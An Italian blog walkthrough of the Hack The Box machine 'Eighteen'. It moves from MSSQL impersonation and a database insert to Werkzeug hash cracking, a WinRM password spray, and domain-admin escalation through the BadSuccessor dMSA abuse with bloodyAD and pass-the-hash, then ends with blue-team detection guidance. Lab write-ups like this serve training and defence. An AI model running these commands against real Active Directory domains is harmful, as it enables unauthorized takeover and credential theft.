---
title: 'HTB Eighteen Walkthrough: MSSQL e privesc BadSuccessor(dMSA)'
slug: htb-eighteen-badsuccessor-dmsa-walkthrough
description: 'WriteUp Hack The Bpx Eighteen: impersonation MSSQL, cracking hash Werkzeug PBKDF2, privilege escalation con BadSuccessor (CVE-2025-53779) su Windows Server 2025'
image: /eighteen-walktrough-hack-the-box.webp
draft: false
date: 2026-07-11T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - BadSuccessor
---

# Hack The Box (HTB) Eighteen Walkthrough : da MSSQL Impersonation a Domain Admin con BadSuccessor (dMSA)

Eighteen è una macchina Windows Server 2025 di HackTheBox che parte da un'impersonation MSSQL per arrivare a un hash Werkzeug PBKDF2 da craccare, prosegue con un password spraying che apre l'accesso WinRM, e si chiude sfruttando **BadSuccessor** ([CVE-2025-53779](https://www.ictpower.it/sistemi-operativi/windows-server-2025-delegated-managed-service-accounts-dmsa.htm)): un abuso della migrazione dei **Delegated Managed Service Account (dMSA)**, la nuova tipologia di account di servizio introdotta in Windows Server 2025, che permette a un utente con un semplice permesso di scrittura su una OU di ottenere i privilegi di Domain Admin senza toccare alcun gruppo privilegiato.

## 1. Ricognizione iniziale

Una scansione delle porte mostra solo tre servizi esposti: **HTTP (80)**, **MSSQL (1433)** e **WinRM (5985)** — una combinazione che segnala fin da subito un ambiente Windows con un'applicazione web che dialoga con un database SQL Server.

```bash
nmap -p- -vvv --min-rate 10000 10.129.28.94
```

Il sito su porta 80 reindirizza al dominio `eighteen.htb`, quindi va aggiunto a `/etc/hosts` prima di proseguire. Si tratta di un'app Flask (riconoscibile dalla pagina 404 di default) che gestisce un piccolo gestionale di finanza personale, con login, registrazione e un pannello `/admin` riservato.

Un controllo con `curl` conferma lo stack e lo stato del server:

```bash
curl http://eighteen.htb/ -v
```

```
* Host eighteen.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.28.94
*   Trying 10.129.28.94:80...
* Established connection to eighteen.htb (10.129.28.94 port 80) from 10.10.14.146 port 34860
* using HTTP/1.x
> GET / HTTP/1.1
> Host: eighteen.htb
> User-Agent: curl/8.19.0
> Accept: */*
>
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html; charset=utf-8
< Vary: Cookie
< Server: Microsoft-IIS/10.0
< Date: Sat, 11 Jul 2026 08:52:44 GMT
< Content-Length: 2253
```

L'header `Date` restituito dal server è utile già in questa fase: confrontandolo con l'orario del proprio host si nota subito uno scarto significativo. Meglio sincronizzare da subito l'orologio locale con quello del target — l'autenticazione Kerberos, che tornerà più avanti (sia per l'accesso di dominio sia per l'exploitation di BadSuccessor), tollera solo pochi minuti di differenza tra client e domain controller, oltre i quali i ticket vengono rifiutati.

Nessun path interessante emerge dal directory brute force oltre a quelli già noti: l'app tratta ogni URL sconosciuto come home page, quindi il fuzzing produce solo rumore.

## 2. Enumerazione MSSQL e impersonation

Con le credenziali fornite (`kevin`), il login su MSSQL funziona solo in modalità locale, non come account di dominio:

```bash
mssqlclient.py eighteen.htb/kevin:'<password>'@eighteen.htb
```

`kevin` non ha privilegi di sysadmin e non può accedere al database applicativo `financial_planner`. Tuttavia l'enumerazione dei permessi di impersonation rivela qualcosa di utile:

```sql
enum_impersonate
```

`kevin` può impersonare l'account **appdev**, quello realmente usato dall'applicazione web per parlare col database. Con `exec_as_login appdev` si ottiene accesso completo a `financial_planner`, dove la tabella `users` contiene l'hash della password dell'utente admin del sito.

Per approfondire l'enumerazione e l'abuso di MSSQL (impersonation, link server, xp\_cmdshell e tecniche correlate) vedi l'articolo dedicato su hackita: [Porta 1433 - MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

Non conoscendo ancora l'hash reale dell'amministratore (va craccato, come vedremo tra poco), il tentativo più rapido è generare un hash Werkzeug di cui si conosce già la password in chiaro e inserirlo direttamente nella tabella, così da avere subito un accesso admin funzionante senza aspettare il cracking. Cerco online un generatore di hash Werkzeug e creo l'hash che inserirò nel database.

```sql
INSERT INTO users (full_name, username, email, password_hash, is_admin, created_at)
VALUES ('hackita', 'hackita', 'info@hackita.com',
'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$58167801adc92759a129a1dbc5a6bdc22912a4b9f56709ccfa218c85fbab9476',
1, '2026-1-1 05:39:03');
```

Il login con l'utente `hackita` e la password nota funziona regolarmente, e l'accesso a `/admin` viene concesso. Il pannello, però, non porta a nulla di ulteriormente sfruttabile: mostra solo informazioni di base (tipo di database, hostname, nome dell'applicazione), senza funzionalità aggiuntive da abusare. A questo punto, prima di scartare del tutto questa pista, vale la pena provare qualche payload lato applicativo (SSTI, dato che si tratta di un'app Flask, o altri parametri della form) — ma anche qui non emerge nulla di sfruttabile, e diventa chiaro che la strada corretta è recuperare e craccare l'hash reale dell'amministratore per proseguire l'enumerazione con le sue credenziali effettive.

Parallelamente, un attacco di RID cycling attraverso MSSQL (fattibile anche senza privilegi elevati, sfruttando la possibilità di risolvere SID arbitrari) permette di enumerare gli utenti di dominio e ricostruire lo schema dei nomi utente (`nome.cognome`).

## 3. Recupero e cracking dell'hash Werkzeug

L'hash trovato nella tabella `users` ha questo formato:

```
pbkdf2:sha256:600000$<salt>$<hash>
```

Non è direttamente compatibile con `hashcat`, che per il modulo 10900 (PBKDF2-HMAC-SHA256) si aspetta il formato `sha256:iterazioni:salt_base64:hash_base64`. Il punto che genera più confusione la prima volta è che **sia il salt che l'hash vanno portati in base64** — il salt partendo da testo semplice, l'hash partendo da esadecimale (quindi va prima decodificato da hex a byte grezzi e poi ricodificato).

Uno script Python reperibile online per questo specifico problema automatizza la conversione:

```python
import base64, codecs, re, sys

with open(sys.argv[1], 'r') as f:
    hashes = f.readlines()

for h in hashes:
    m = re.match(r'pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)', h)
    iterations, salt, hashe = m.group(1), m.group(2), m.group(3)
    print(f"sha256:{iterations}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(codecs.decode(hashe,'hex')).decode()}")
```

Con l'hash riformattato, `hashcat` lo riconosce in autodetect e lo craccka contro rockyou in pochi secondi, restituendo la password in chiaro dell'amministratore del sito.

## 4. Password spraying e accesso WinRM

Con la password recuperata e la lista di utenti di dominio ottenuta via RID cycling, un semplice password spray su WinRM rivela il riutilizzo della password:

```bash
nxc winrm eighteen.htb -u users.txt -p '<password>' --continue-on-success
```

Un solo account, **adam.scott**, riutilizza la stessa password e appartiene a un gruppo abilitato all'accesso WinRM. Da qui si ottiene la prima shell e la flag utente.

## 5. Enumerazione Active Directory con BloodHound

Con SharpHound (o RustHound) si raccoglie la mappa dei permessi del dominio. Un dettaglio salta subito all'occhio interrogando il dominio direttamente via PowerShell:

```powershell
Get-ADDomain | Select Name, DomainMode
Get-ADForest | Select Name, ForestMode
```

Il dominio risulta al **livello funzionale Windows Server 2025** — una configurazione non comune, perché normalmente il livello funzionale resta più basso finché non serve una feature specifica della versione più recente. Questo dettaglio è il primo indizio che porta verso BadSuccessor.

## 6. Cos'è un dMSA e perché è pericoloso

### La famiglia degli account di servizio gestiti

In Active Directory, gli **account di servizio** fanno girare servizi Windows (SQL Server, IIS, applicazioni custom) invece di un utente umano. Il problema storico è sempre stato lo stesso: account con password statiche, spesso non ruotate per anni, riutilizzate su più macchine, e conservate in chiaro o recuperabili con tecniche come il Kerberoasting.

Microsoft ha affrontato il problema in tre generazioni successive:

| Tipo                  | Introdotto in          | Ambito di utilizzo                                                       | Chi gestisce la password                                                                     |
| --------------------- | ---------------------- | ------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------- |
| **sMSA** (standalone) | Windows Server 2008 R2 | Un solo server, non trasferibile                                         | Active Directory, rotazione automatica                                                       |
| **gMSA** (group)      | Windows Server 2012    | Più server contemporaneamente (cluster, farm applicative)                | Active Directory, rotazione automatica, condivisa tra host autorizzati                       |
| **dMSA** (delegated)  | Windows Server 2025    | Un server specifico, con binding rinforzato all'identità del dispositivo | Derivata dalle credenziali del computer, protetta da TPM/Credential Guard quando disponibili |

Il dMSA nasce specificamente per **sostituire un account di servizio legacy esistente** senza interrompere il servizio che lo usa: un amministratore avvia una migrazione, il dMSA "eredita" tutto ciò che serve (SPN, delega, gruppi) dall'account originale, e una volta completata la transizione l'account legacy viene disabilitato.

### Un esempio concreto: `svc_sql`

Per capire la differenza tra le tre generazioni conviene pensare a un caso reale: un account `svc_sql` usato per far girare il servizio SQL Server.

* Con un **sMSA**, quell'account funziona solo sulla macchina su cui è stato configurato. Se l'azienda ha due server SQL diversi (`SQL01` e `SQL02`), serve un sMSA distinto per ciascuno — non è trasferibile.
* Con un **gMSA**, lo stesso account può essere condiviso tra più server contemporaneamente: utile per cluster o farm applicative dove più macchine devono autenticarsi con la stessa identità di servizio.
* Con un **dMSA**, si torna concettualmente a un solo server (come lo sMSA), ma con una protezione della password molto più forte: il segreto è legato all'identità hardware del dispositivo che lo usa (TPM, o Virtualization-Based Security tramite Credential Guard quando il TPM non è disponibile), non semplicemente "gestito da AD" come nei due casi precedenti.

In tutti e tre i casi la password non la scrive né la conosce nessun amministratore a mano: ruota da sola, esattamente come succede per gli account macchina (`NOMEPC$`) che ogni computer del dominio possiede.

### Glossario minimo: TPM, VBS, Credential Guard

* **TPM (Trusted Platform Module)**: chip fisico separato sulla scheda madre, isolato dal resto del sistema. Custodisce chiavi crittografiche che non sono mai accessibili come RAM o disco normali.
* **VBS (Virtualization-Based Security)**: usa la virtualizzazione hardware per creare una zona di memoria isolata all'interno di Windows stesso. Anche se il sistema operativo principale viene compromesso, quella zona resta protetta.
* **Credential Guard**: funzionalità che sfrutta la zona isolata creata da VBS specificamente per proteggere le credenziali, impedendo che vengano estratte da malware o strumenti come Mimikatz.

### Perché il dMSA è "più sicuro" solo in teoria

L'idea alla base del dMSA è buona: il segreto non sta più solo "da qualche parte in AD", ma è ancorato all'hardware della macchina autorizzata, rendendolo più difficile da esfiltrare anche se il server viene compromesso. Il problema di BadSuccessor non riguarda questa protezione in sé — riguarda **il processo di migrazione**, cioè il momento in cui un account vecchio "diventa" un dMSA, che si è rivelato controllabile da chi non dovrebbe poterlo fare.

### Il meccanismo di migrazione

Il meccanismo di migrazione da un account legacy a un dMSA si basa su due attributi chiave:

* **`msDS-ManagedAccountPrecededByLink`**: indica quale account il dMSA sta sostituendo
* **`msDS-DelegatedMSAState`**: indica lo stato della migrazione (2 = completata)

Quando un dMSA autentica, il **Key Distribution Center (KDC)** costruisce il ticket Kerberos includendo i gruppi e i privilegi dell'account "predecessore" collegato tramite quell'attributo — così il passaggio da account legacy a dMSA è trasparente per i servizi che ne dipendono.

### Dove nasce il bug

La procedura "ufficiale" di migrazione (cmdlet `Start-ADServiceAccountMigration` / `Complete-ADServiceAccountMigration`) è riservata ai Domain Admin: un utente normale non può avviarla. Il problema è che quella procedura, alla fine, si limita a scrivere due valori LDAP sull'oggetto dMSA — non c'è nessuna verifica crittografica, nessuna firma, nessun controllo aggiuntivo. Il **Key Distribution Center (KDC)** si fida ciecamente del contenuto di `msDS-ManagedAccountPrecededByLink`: se un dMSA lo ha valorizzato e `msDS-DelegatedMSAState` è a 2, il KDC costruisce il ticket come se una migrazione legittima fosse davvero avvenuta, senza chiedersi *chi* ha scritto quei due valori.

Questo significa che chi ha semplicemente il diritto di **modificare gli attributi di un dMSA che possiede** (non serve alcun permesso sull'account che si vuole impersonare) può ottenere lo stesso identico effetto della migrazione ufficiale, semplicemente scrivendo a mano quei due campi.

E creare un dMSA proprio è più facile di quanto sembri: normalmente andrebbero creati nel container protetto "Managed Service Accounts", riservato agli amministratori — ma nulla vieta di crearli in **qualsiasi altra OU** del dominio. Basta avere `Create All Child Objects` (o, più specificamente, il diritto di creare oggetti `msDS-DelegatedManagedServiceAccount`) su quella OU: un permesso comunissimo, spesso delegato ad help desk o team IT per compiti di routine, e quasi mai considerato sensibile da chi audita i permessi AD.

Il percorso di attacco completo, quindi, è:

1. Trovare una OU su cui si ha diritto di creare oggetti (spesso già presente per delega esistente, non richiede escalation preventiva)
2. Creare al suo interno un dMSA fittizio — essendone il creatore, se ne ha automaticamente il pieno controllo
3. Scrivere a mano `msDS-ManagedAccountPrecededByLink` puntando a un account ad alto privilegio (es. Administrator) e `msDS-DelegatedMSAState` a 2
4. Richiedere un TGT per il dMSA: il PAC del ticket risultante conterrà i gruppi e i SID dell'account target, Domain Admin incluso

Il punto che rende BadSuccessor particolarmente insidioso dal punto di vista difensivo è che **nessun gruppo privilegiato viene toccato** e **nessuna scrittura avviene sull'account target**: tutta la manipolazione resta confinata a un oggetto dMSA di nuova creazione, che a un controllo superficiale non ha nulla a che vedere con l'account che si sta di fatto impersonando.

Un effetto collaterale non ovvio, sfruttato anche nel walkthrough di questa macchina, riguarda le **chiavi Kerberos**: per garantire che i ticket già emessi prima della "migrazione" restino validi, il KDC include nel pacchetto di chiavi del dMSA anche le chiavi Kerberos dell'account collegato — compreso, quando l'account bersaglio usa ancora RC4 (il default se non è configurato diversamente), il suo hash NT in chiaro. In pratica, oltre a un ticket con i privilegi del target, l'attacco può restituire direttamente l'hash della password.

## 7. Sfruttamento di BadSuccessor

Il primo passo è verificare quali OU sono sfruttabili. Il gruppo di ricerca Akamai ha pubblicato uno script PowerShell dedicato:

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

Nel caso di Eighteen, il gruppo **IT** (di cui adam.scott fa parte) risulta avere i permessi necessari su `OU=Staff`.

Lo stesso controllo si può fare da remoto con NetExec, senza bisogno di caricare nulla sulla macchina target:

```bash
nxc ldap 10.129.28.94 -u adam.scott -p '<password>' -M badsuccessor
```

Per l'exploitation vera e propria, al momento della stesura di questo articolo il modulo NetExec ufficiale gestisce solo la fase di verifica: la creazione del dMSA e il collegamento fraudolento sono disponibili in un branch separato non ancora integrato nel progetto principale, oppure tramite tool alternativi come **bloodyAD**, che espone lo stesso attacco in un singolo comando:

```bash
bloodyAD -d eighteen.htb -u adam.scott -p '<password>' --host <IP> \
  add badSuccessor hackita --ou "OU=Staff,DC=eighteen,DC=htb" \
  -t "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
```

Il comando crea il dMSA, imposta i due attributi di collegamento e richiede direttamente un TGT per l'account appena creato. Nella risposta compaiono anche le **previous keys** del dMSA: poiché il meccanismo di migrazione trasferisce anche le chiavi Kerberos dell'account predecessore (per garantire continuità con i ticket già emessi), tra queste chiavi si trova l'hash NT dell'account target — nel caso di Eighteen, direttamente l'hash dell'Administrator.

A questo punto è sufficiente autenticarsi con quell'hash per ottenere una shell come amministratore di dominio:

```bash
nxc smb <IP> -u administrator -H <hash_NT>
evil-winrm -i <IP> -u administrator -H <hash_NT>
```

## 8. Detection Blue Team

BadSuccessor lascia tracce specifiche che un team di detection può monitorare:

* **Creazione di oggetti dMSA anomali**: Event ID 5137 su OU normalmente non destinate ad account di servizio, generati da utenti che non gestiscono abitualmente questo tipo di oggetti
* **Modifica dell'attributo `msDS-ManagedAccountPrecededByLink`**: Event ID 5136, segnale quasi certo di un tentativo di abuso se il valore punta a un account ad alto privilegio
* **Autenticazioni dMSA anomale**: Event ID 2946 nel log Directory Service, con il campo Caller SID valorizzato come `S-1-5-7` (identità anonima) — un pattern che su dMSA appena creati e mai usati prima merita attenzione
* **Revisione periodica delle delego sulle OU**: molte organizzazioni concedono `CreateChild` generico su OU delegate (es. per help desk) senza restringerlo alle sole classi di oggetto realmente necessarie — la mitigazione più efficace resta limitare esplicitamente quali classi di oggetto (utenti, computer, ma non account di servizio) un principal può creare

Vale la pena ricordare che Microsoft ha successivamente rilasciato una patch per i controller di dominio: ambienti con DC aggiornati oltre una certa build non sono più vulnerabili a questa variante specifica dell'attacco.

## 9. Conclusioni

Eighteen è formalmente etichettata come macchina "Easy" su HackTheBox, ma il numero di step logici non riflette la reale difficoltà incontrata. La complessità non stava nella catena in sé — pochi passaggi, ben collegati — ma nella profondità delle conoscenze richieste per riconoscerli: un formato hash Werkzeug non banale da riformattare, e una vulnerabilità (BadSuccessor) pubblicata da meno di un anno al momento della release della macchina.

C'era anche il rischio concreto di perdersi lato web: trattandosi di un'app Flask, è naturale provare payload diversi pensando a vulnerabilità note su questo stack (ad esempio SSTI) o ad altre strade di attacco sul form di login/registrazione, prima di rendersi conto che il vettore reale passava da MSSQL e non dall'applicazione web in sé. È un buon promemoria di come, in Active Directory, permessi apparentemente innocui su una OU (come un semplice diritto di creare oggetti) possano tradursi in una escalation completa a Domain Admin, specialmente quando entrano in gioco funzionalità nuove come i dMSA.

***

*Articolo a cura del team di [Hackita](https://hackita.it) — risorse italiane di offensive security, walkthrough HTB/ProLabs e preparazione OSCE3.*
